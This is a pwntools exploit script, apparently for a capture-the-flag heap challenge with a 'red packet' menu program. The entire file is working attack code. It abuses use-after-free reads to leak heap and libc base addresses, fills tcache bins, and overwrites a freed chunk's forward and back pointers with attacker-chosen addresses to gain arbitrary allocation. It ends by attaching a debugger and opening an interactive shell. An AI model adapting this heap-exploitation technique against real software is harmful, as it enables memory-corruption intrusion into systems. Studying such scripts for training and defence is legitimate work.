from pwn import *
# context.log_level="debug"
sh=process("./pwn")
def cmd(c):
    sh.sendlineafter(b"Your input: ", str(c).encode())
def add(idx,size,ctt): #(1.0x10 2.0xf0 3.0x300 4.0x400)
    cmd(1)
    sh.sendlineafter(b"Please input the red packet idx: ", str(idx).encode())
    sh.sendlineafter(b"How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ", str(size).encode())
    sh.sendlineafter(b"Please input content: ", ctt)
def dele(idx):
    cmd(2)
    sh.sendlineafter(b"Please input the red packet idx: ", str(idx).encode())
def edit(idx,ctt):
    cmd(3)
    sh.sendlineafter(b"Please input the red packet idx: ", str(idx).encode())
    sh.sendafter(b"Please input content: ", ctt)
def show(idx):
    cmd(4)
    sh.sendlineafter(b"Please input the red packet idx: ", str(idx).encode())
def backdoor():
    cmd(666)
add(0,4,"nihao")
add(1,1,"pad")
add(2,4,"nihao")
add(3,1,"pad")
add(4,4,"nihao")

dele(3)
dele(1)
show(1)
#todo: recvheap
leak_heap=u64(sh.recvuntil(b"\x55")[-6:].ljust(8,b'\x00'))
heapbase=((leak_heap>>12)<<12) - 0x1000
success("heapbase:"+hex(heapbase))

for i in range(7):
    add(5+i,4,"nihao")
for i in range(7):
    dele(5+i) #11

for i in range(5):
    add(5+i,2,"nihao")
for i in range(5):
    dele(5+i)

dele(0)
show(0)
#todo: recvlibc
leak_libc=u64(sh.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
libcbase=leak_libc-0x1e4ca0
success("libcbase:"+hex(libcbase))

add(12,3,"nihao")

dele(2)
add(13,3,"nihao")

dele(4)
add(14,3,"nihao")

target=heapbase+0x250+0x10+0x800-0x10
success("target:"+hex(target))
add(15,3,p64(0)+p64(target)) #heapbase+0x4040


# edit(2,b"a"*0x300+p64(0)+p64(0x101)+p64(heapbase+0x1570)+p64(heapbase+0x3b40))
edit(2,b"a"*0x300+p64(0)+p64(0x101)+p64(heapbase+0x1570)+p64(heapbase+0x4040))

#bk :0->2->15

gdb.attach(sh)

add(16,2,"nihao")
sh.interactive()